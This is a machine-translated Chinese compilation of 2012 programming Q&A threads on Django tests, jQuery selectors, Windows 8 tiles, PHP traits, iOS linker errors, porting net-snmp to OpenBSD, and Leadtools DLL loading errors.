> 时间：2012-09-04T13:52:29.083
> 
> 标签：django, django-testing

**背景**

我有一个 Django*项目*，它可能会部署为多个实例。该项目包含许多*应用程序*，例如以下架构：

```
myproject
|-- myapp_a
|   |-- models.py
|   ...
`-- myapp_b
|   |-- models.py
|   ...
... 
```

我目前已经`test.py`在应用程序目录中为这些应用程序中的每一个放置了一个，用一组数据（夹具和其他必要的文件）测试了许多功能。

另一方面，我也有我所谓的自动测试*实例，这是我**项目*的测试部署，我将上述*应用程序*用作`INSTALLED_APPS`：

```
autotest
|-- conf
|   `-- someconf.conf
|-- data
|   |-- dataset1.dat
|   |-- dataset2.dat
|   |-- ...
|   `-- mydb.sqlite
|-- manage.py
|-- settings.py
`-- urls.py 
```

我现在的问题是，测试代码由我的*项目*提供，但测试数据在我的自动测试*实例*中，但代码当然与数据相关联。

我想将单个`test.py`文件从*应用程序*目录移动到*自动测试实例*的子文件夹，如下所示：

```
autotest
...
|-- tests
|   |-- myapp_a
|   |   `-- test.py
|   |-- myapp_b
|   |   `-- test.py
... ... 
```

但仍想使用`python manage.py test myapp_a myapp_b ...`. 我怎么能做到这一点？

# javascript - 从 div 中选择第一个 img

> ID：12264985
> 
> 赞同：1
> 
> 时间：2012-09-04T13:52:29.460
> 
> 标签：javascript, jquery

我有以下html。

```
<div>
   <img class="foo">
   <a href="#" onClick="changeImage(this, param1, param2)">sth</a>
</div> 
```

当用户单击链接时，我想更改图像的类别（删除`foo`、添加）。`bar`但是，我无法为 jquery 写下正确的选择器。

我也不确定我是否真的需要将 传递`this`给函数。

```
function changeImage(link, param1, param2) {

    //Following line does not work
    $(link).parent('div img').removeClass("foo").addClass("bar");

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:53:56.950

您也不需要将 -this- 传递到您的 onclick 中，我们甚至没有在函数中影响它，我们无论如何都可以抓取它。

```
function changeImage(link, param1, param2) {

    //Following line does not work
    //$(link).parent('div img').removeClass("foo").addClass("bar");

    $(this).closest('div').find('img').removeClass('foo').addClass('bar');
    return false; // stops the <a> link from doing anything else
} 
```

附带说明：尽量不要在任何 DOM 元素上使用任何 onclick/onmouseover/etc 事件，每个元素都会在旧版浏览器 (IE) 中单独创建一个脚本块，并且页面上有成百上千个元素，它可能会降低性能.

使用`.click()`, `.on()`, 代替您支持的任何版本的 jQuery 版本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T13:54:25.510

你可以这样做

```
$(link).parent('div img:first').removeClass("foo").addClass("bar"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-04T13:54:34.460

假设您的标记将保持如您在问题中所示：

```
$(link).prev().removeClass("foo").addClass("bar"); 
```

该`.prev()`方法将选择前一个同级，在您的情况下是`img`元素。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T13:55:45.697

试试这个代码：

```
 function changeImage(link, param1, param2) {
        $(this).closest('div').find('img:first').removeClass('foo').addClass('bar');
        return false;
    } 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-04T13:57:10.253

```
$(link).prev('img').removeClass("foo").addClass("bar"); 
```

或者

```
$(link).siblings('img').removeClass("foo").addClass("bar"); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-04T14:13:28.847

你可以试试这个

***JS代码***

```
function changeImage(link, param1, param2) {
    $(link).siblings().removeClass('foo').addClass('bar');
} 
```

# windows-8 - 获取当前 windows8 应用程序块列表

> ID：12264987
> 
> 赞同：0
> 
> 时间：2012-09-04T13:52:36.563
> 
> 标签：windows-8, microsoft-metro

我可以获得我的应用程序当前可用的磁贴列表吗？

我的意思是在我自己的应用程序中显示的当前未过期的平铺列表。例如，如果我添加了 4 个磁贴更新，其中一个已过期，我需要获取剩余三个的列表。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T14:25:03.323

使用 SecondaryTile.FindAllAsync() 查找所有辅助磁贴

[http://msdn.microsoft.com/en-us/library/windows/apps/br242208.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/br242208.aspx)

使用 TileUpdater.GetScheduledTileNotifications() 获取所有通知：

[http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.notifications.tileupdater.getscheduledtilenotifications.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.notifications.tileupdater.getscheduledtilenotifications.aspx)

然后 TileUpdate.RemoveFromSchedule() 删除一个

[http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.notifications.tileupdater.removefromschedule.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.notifications.tileupdater.removefromschedule.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T16:54:07.780

无法访问磁贴上显示的通知/更新。

# php - php对象子使用其他子函数

> ID：12264996
> 
> 赞同：3
> 
> 时间：2012-09-04T13:52:49.677
> 
> 标签：php, oop, class

是否有可能

扩展类的扩展，例如：

```
class a {
}
class b extends a {
}
class c extends b {
} 
```

编辑：

[或 c 类可以使用仅在 b 中定义但不能在 a 中定义的函数的其他方式。]

好吧，我只是注意到我的问题有点混乱。c 应该能够使用所有功能，当然还有 a 的功能。

我会接受解决我不存在的问题的答案，以防有人搜索。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T14:04:11.847

从 PHP 5.4 开始，您可以使用可能对您有帮助的特征。您可以定义两个特征，一个包含 class`a`具有的函数，另一个包含 class`b`具有的函数，但不包含 class `a`。

所以：

```
trait TraitA {
    function a1() { }
    function a2() { }
}

trait TraitB {
    function b1() { }
    function b2() { }
} 
```

然后你可以定义一个`a`只使用`TraitA`的类，一个`b`同时使用这两个特征的类，以及一个`c`只使用的类`TraitB`：

```
class a {
    use TraitA
    // contains a1 and a2
}

class b {
    use TraitA, TraitB
    // contains a1, a2, b1 and b2
}

class a {
    use TraitB
    // contains b1 and b2
} 
```

更多关于特征的信息：http: [//php.net/manual/en/language.oop5.traits.php](http://php.net/manual/en/language.oop5.traits.php) 请记住，您必须注意不同特征之间的函数名称。两个特征中不能有相同的函数名，否则会发生冲突。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-04T14:02:32.167

这是不可能的。根据定义，类 B 是类 A 的“扩展”。这意味着如果类 a 具有方法，`method_in_class_a()`那么类 B 将`method_in_class_a()`在您配置类之前作为 BASE 具有。

您需要做的就是反其道而行之：

```
class b { ... }

class a extends b { /* has methods from b and a */ }

class c extends b { /* can only use methods from b */ } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T14:04:36.643

我不确定你为什么需要这样做，但是......

除非方法和属性被定义为`private`方法，否则所有扩展类都可以访问它们并且可以扩展，除非父方法声明为`final`.

但是，从 PHP5.4 开始，您可以使用[Traits](http://php.net/manual/en/language.oop5.traits.php)。

```
<?php

trait BOnly 
{
    function getReturnType() { /* 1 */ }
    function getReturnDescription() { /* 2 */ }
}

class A 
{

}

class B extends A
{
    use BOnly;  
}

class C extends B
{

} 
```

# iphone - 仅在为模拟器构建时重复符号

> ID：12264997
> 
> 赞同：7
> 
> 时间：2012-09-04T13:52:52.373
> 
> 标签：iphone, objective-c, ios, xcode, ios-simulator

为设备（ipad 3）构建时，我的构建工作没有警告或错误，但在为 iPad 或 iPhone 模拟器构建时，我收到如下链接器错误：

```
duplicate symbol _CONSTANT_NAME in:
/Users/me/libLibrary.a(FileName.o)
/Users/me/libOtherLibrary.a(OtherFileName.o) 
```

常量在头文件中定义如下

```
const int CONSTANT_NAME = 123; 
```

我尝试将常量包装在#define 标记中，如下所示：

```
#ifndef CONSTANTS_H
#define CONSTANTS_H

const int CONSTANT_NAME = 123;

#endif 
```

为什么在为设备构建时这可以正常工作，但在为模拟器构建时会导致问题？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-04T14:08:19.840

编译器正在告诉你完全正确的事情。您很幸运，直接构建到 iPad 时不会发生这种情况。

在包含此标头的每个 .m 文件中，您将创建一个具有相同名称的新的不同变量。编译器可以在将所有这些文件链接到单个 .a 时解决此问题，但是当构建多个 .a 文件并将这些多个 .a 文件链接在一起时，编译器会编译重复副本。

我会做以下三件事之一：

1.  把`const int`变成`#define`.`#define CONSTANT_NAME 123`
2.  在`const int`.`static const int CONSTANT_NAME = 123;`
3.  在之前添加 extern`const int`并将实数添加`const int`到单个 .m。在.h 中，`extern const int CONSTANT_NAME;`. 在单 .m 中，`const int CONSTANT_NAME = 123;`.

对于最后一个，我将创建一个 constants.m 文件作为单独的位置来保存`const int CONSTANT_NAME = 123;`定义。

希望有帮助。

# python - 在 openBSD5.1 编译 net-snmp 5.7.1

> ID：12264998
> 
> 赞同：0
> 
> 时间：2012-09-04T13:52:56.793
> 
> 标签：python, net-snmp, openbsd

我正在尝试在 openBSD5.1 上编译 net-snmp 5.7.1。编译中的错误是

结构没有名为`kp_proc' structure has no member named`kp_eproc' 的成员

任何人都可以帮我解决这个问题吗？

以及如何在 openBSD 上进行 python 绑定？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T23:42:28.923

好的，这可能是一篇很长的文章，因为我们将尝试将您的软件移植到 OpenBSD 上。
您会看到 OpenBSD 的 k_proc 结构上没有这个 eproc 字段。检查声明： [proc@OpenBSD](http://fxr.watson.org/fxr/source/sys/proc.h?v=OPENBSD;im=excerpts#L152)

在最新来源中解决问题：

```
./agent/mibgroup/host/data_access/swrun_kinfo.c:        entry->hrSWRunPerfCPU  =     proc_table[i].kp_eproc.e_uticks;
./agent/mibgroup/host/data_access/swrun_kinfo.c:        entry->hrSWRunPerfCPU += proc_table[i].kp_eproc.e_sticks;
./agent/mibgroup/host/data_access/swrun_kinfo.c:        entry->hrSWRunPerfCPU +=   proc_table[i].kp_eproc.e_iticks;
./agent/mibgroup/host/data_access/swrun_kinfo.c:        entry->hrSWRunPerfMem  = proc_table[i].kp_eproc.e_vm.vm_tsize;
./agent/mibgroup/host/data_access/swrun_kinfo.c:        entry->hrSWRunPerfMem += proc_table[i].kp_eproc.e_vm.vm_ssize;
./agent/mibgroup/host/data_access/swrun_kinfo.c:        entry->hrSWRunPerfMem += proc_table[i].kp_eproc.e_vm.vm_dsize;
./agent/mibgroup/host/hr_swrun.c:        long_return = proc_table[LowProcIndex].kp_eproc.e_uticks +
./agent/mibgroup/host/hr_swrun.c:            proc_table[LowProcIndex].kp_eproc.e_sticks +
./agent/mibgroup/host/hr_swrun.c:            proc_table[LowProcIndex].kp_eproc.e_iticks;
./agent/mibgroup/host/hr_swrun.c:            proc_table[LowProcIndex].kp_eproc.e_vm.vm_map.size / 1024;
./agent/mibgroup/host/hr_swrun.c:        long_return = proc_table[LowProcIndex].kp_eproc.e_vm.vm_tsize +
./agent/mibgroup/host/hr_swrun.c:            proc_table[LowProcIndex].kp_eproc.e_vm.vm_ssize +
./agent/mibgroup/host/hr_swrun.c:            proc_table[LowProcIndex].kp_eproc.e_vm.vm_dsize;
./agent/mibgroup/ucd-snmp/proc.c:#define EP(pp, field) ((pp)->kp_eproc . field)
./agent/mibgroup/ucd-snmp/proc.c:#define VP(pp, field) ((pp)->kp_eproc.e_vm . field) 
```

啊哈！所以我们还需要注意这些 vm 结构......我们对应的 decleration 是：[p_vmspace@OpenBSD](http://fxr.watson.org/fxr/source/uvm/uvm_extern.h?v=OPENBSD;im=bigexcerpts#L388)

好的，所以通常将这些 .kp_eproc.e_thing 更改为 .p_thing
并将 .kp_eproc.e_vm.thing 更改为 .p_vmspace->thing （它是一个指针） *应该可以*工作。

宏需要一些注意，我认为我做对了，但由于我仍在一个*相当慢*的 sparc64 上编译这些更改，因此需要一些时间才能让你得到测试的差异。

但这应该是一般的想法。

如果您的整个过程正常，您可以将此补丁添加到您的端口/树以及易于制作的 Makefile 并使用 pkg_* 工具管理您的 OpenBSD 包，但在未来的编辑中会更多。

干杯！

DSP

编辑：这是将编译的第一个差异，但第二个宏是错误的。请测试。

```
diff -ur net-snmp-5.7.1/agent/mibgroup/host/data_access/swrun_kinfo.c mynet-    snmp-5.7.1/agent/mibgroup/host/data_access/swrun_kinfo.c
--- net-snmp-5.7.1/agent/mibgroup/host/data_access/swrun_kinfo.c        Wed Sep 28 07:53:47 2011
+++ mynet-snmp-5.7.1/agent/mibgroup/host/data_access/swrun_kinfo.c      Wed Sep  5 04:26:54 2012
@@ -85,10 +85,10 @@
  * early FreeBSD, NetBSD, OpenBSD kinfo_proc field names
  */
 #define SWRUN_TABLE    kinfo_proc
 -#define SWRUN_K_STAT   kp_proc.p_stat
 -#define SWRUN_K_PID    kp_proc.p_pid
 -#define SWRUN_K_COMM   kp_proc.p_comm
 -#define SWRUN_K_FLAG   kp_proc.p_flag
 +#define SWRUN_K_STAT   p_stat
 +#define SWRUN_K_PID    p_pid
 +#define SWRUN_K_COMM   p_comm
 +#define SWRUN_K_FLAG   p_flag
 /*      SWRUN_K_CLASS  not defined     */
 #endif

@@ -159,7 +159,8 @@
 #if HAVE_KVM_GETPROC2
     proc_table = kvm_getproc2(kd, KERN_PROC_ALL, 0, sizeof(struct kinfo_proc2), &nprocs );
 #else
-    proc_table = kvm_getprocs(kd, KERN_PROC_ALL, 0, &nprocs );
+    proc_table = kvm_getprocs(kd, KERN_PROC_ALL, 0, sizeof(struct kinfo_proc), &nprocs );
+    //proc_table = kvm_getprocs(kd, KERN_PROC_ALL, 0, &nprocs );
 #endif
     for ( i=0 ; i<nprocs; i++ ) {
         if ( 0 == proc_table[i].SWRUN_K_STAT )
@@ -304,21 +305,22 @@
        entry->hrSWRunPerfCPU += proc_table[i].kp_lwp.kl_iticks;
        entry->hrSWRunPerfMem  = proc_table[i].kp_vm_map_size / 1024;
 #elif defined(dragonfly)
-       entry->hrSWRunPerfCPU  = proc_table[i].kp_eproc.e_uticks;
-       entry->hrSWRunPerfCPU += proc_table[i].kp_eproc.e_sticks;
-       entry->hrSWRunPerfCPU += proc_table[i].kp_eproc.e_iticks;
+       entry->hrSWRunPerfCPU  = proc_table[i].p_uticks;
+       entry->hrSWRunPerfCPU += proc_table[i].p_sticks;
+       entry->hrSWRunPerfCPU += proc_table[i].p_iticks;
        entry->hrSWRunPerfMem  = proc_table[i].kp_vm_map_size / 1024;

 #else
         /*
          * early FreeBSD, NetBSD, OpenBSD
          */
-        entry->hrSWRunPerfCPU  = proc_table[i].kp_proc.p_uticks;
-        entry->hrSWRunPerfCPU += proc_table[i].kp_proc.p_sticks;
-        entry->hrSWRunPerfCPU += proc_table[i].kp_proc.p_iticks;
-        entry->hrSWRunPerfMem  = proc_table[i].kp_eproc.e_vm.vm_tsize;
-        entry->hrSWRunPerfMem += proc_table[i].kp_eproc.e_vm.vm_ssize;
-        entry->hrSWRunPerfMem += proc_table[i].kp_eproc.e_vm.vm_dsize;
+        entry->hrSWRunPerfCPU  = proc_table[i].p_uticks;
+        entry->hrSWRunPerfCPU += proc_table[i].p_sticks;
+        entry->hrSWRunPerfCPU += proc_table[i].p_iticks;
+        struct vmspace *l = proc_table[i].p_vmspace;
+        entry->hrSWRunPerfMem  = l->vm_tsize;
+        entry->hrSWRunPerfMem += l->vm_ssize;
+        entry->hrSWRunPerfMem += l->vm_dsize;
         entry->hrSWRunPerfMem *= (getpagesize() / 1024);
 #endif
     } 
```

当然，这个差异就像真空一样糟糕，我明天会改进它；）

# c# - 如果有人熟悉 Leadtools，则无法加载文件或程序集“Leadtools.Codecs”

> ID：12264999
> 
> 赞同：3
> 
> 时间：2012-09-04T13:52:57.850
> 
> 标签：c#, visual-studio-2010, dll, leadtools-sdk

我在以下代码的最后一行出现异常（对不起格式，不会让我以任何其他方式发布）：

```
LeadHelper.Unlock(); 
RasterCodecs codecs = new RasterCodecs(); 
string imageLocation = @"...path...\Barcodes.tif"; 
RasterImage srcImage = codecs.Load(imageLocation); 
```

异常内容如下：

> System.BadImageFormatException：无法加载文件或程序集“Leadtools.Codecs，版本=17.5.0.0，Culture=neutral，…………”或其依赖项之一。试图引导格式不正确的程序。

为了试图摆脱这个异常，我引用了所有可能的 Leadtools.Codecs.* DLL、Leadtools.dll ......几乎我们可能引用的每一个 Leadtools dll。

对于我的包含，我包括 Leadtools、Leadtools.Barcode、Leadtools.Codecs、Leadtools.Codecs.Tif、Leadtools.Codecs.Fax 和 Leadtools.Forms

这是我正在制作的用于读取条形码的测试控制台应用程序... VS2010 C#。

另外，我绝对可以访问该文件，它是对网络文件的引用，但尝试在本地引用它，检查权限等

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T14:05:49.770

该消息通常意味着您正在尝试在 64 位系统上加载 32 位 DLL，反之亦然。

验证您是否拥有正确版本的 DLL 及其依赖项。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-05-16T12:34:52.753

到tnw：

这是来自 LEAD 支持的 Daoud。关于我们的映像 .NET DLL 的不同构建，每个 DLL 有 4 个不同的副本（不包括 Silverlight 或 WinRT 构建），它们是：

*   32 位 .NET 4
*   64 位 .NET 4
*   32 位 .NET 2 到 3.5
*   64 位 .NET 2 到 3.5

这意味着不同用户在此处发布的建议大多是正确的。您应该为您的平台和框架版本使用正确的 DLL 构建。但是，如果您在使用我们的工具包时仍然遇到任何问题，请给我们发送电子邮件至 support@leadtools.com，我们将与您一起解决问题。我们通常会在同一工作日内回复，最迟不迟于第二天。

还要确保在运行时加载了正确的 DLL，因为如果您的 PATH 或 GAC 包含 DLL 的多个副本，则可能会加载错误的构建。

关于 Ivan Leonenko 回复的最后一点说明：所提供的信息对于我们的多媒体工具包过滤器和编解码器用户来说是正确的。但是，tnw 似乎正在使用我们的映像 .NET 程序集，它们是不同的 .NET DLL，并且没有“包装器”。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-06-26T10:08:42.537

在 IIS 中将 Enable 32 bit Application in Your Application Pool 设置为 true，然后尝试。我认为它会起作用，因为这是与平台相关的问题。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-04T14:09:18.577

BadImageFormatException 是由平台不匹配引起的。当 Leadtools 程序集针对 x64 编译时，您的项目中的目标是 x86，反之亦然。

要解决此问题，请查看 Visual Studio 中项目的属性。该平台位于构建选项卡上，类似于 x86、x64 或 AnyCPU。

您可能必须使用配置管理器（位于构建菜单下）来添加另一个平台。

这是[包含更多信息的 Microsoft 支持文章](http://support.microsoft.com/kb/967163)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-04T14:00:30.083

看起来您针对该 dll 的框架是错误的。尝试切换引用 dll 的 csproj 的框架。

我不确定leadtools 是在什么框架中构建的，但请尝试在其他所有框架（4.0 客户端、4.0、2.0 等）中构建。

更多信息：http: [//msdn.microsoft.com/en-us/library/bb398202.aspx](http://msdn.microsoft.com/en-us/library/bb398202.aspx)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-04T14:27:10.467

您正在尝试引用错误的程序集。您应该从 LEAD SDK for 4.0 或 2.0 .NET Framework 的 dist 文件夹中为您的案例尝试包装器。

我正在使用他们的屏幕截图和编解码器，并且我只引用了需要的文件（.NET 包装器）： LEncH2644.dll LMISOMux.dll LMScrCap2.dll LMVRGBxf.dll

但是您应该单独交付 LEAD 的核心文件：Leadtools.Multimedia.dll、ltmm.manifest、ltmm175.dll、DSKernel2.dll。最后两个必须在系统上注册（regsvr32）。

Leadtools.Multimedia.dll 必须在锁定/解锁组件的项目中引用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-08-20T22:10:07.253

我已经安装了 Microsoft Visual C++ 2008 & 2010 SP1 Redistributable Package (x86)。

然后，在 IIS 中将应用程序池中的 32 位应用程序启用为 True。它工作得很好。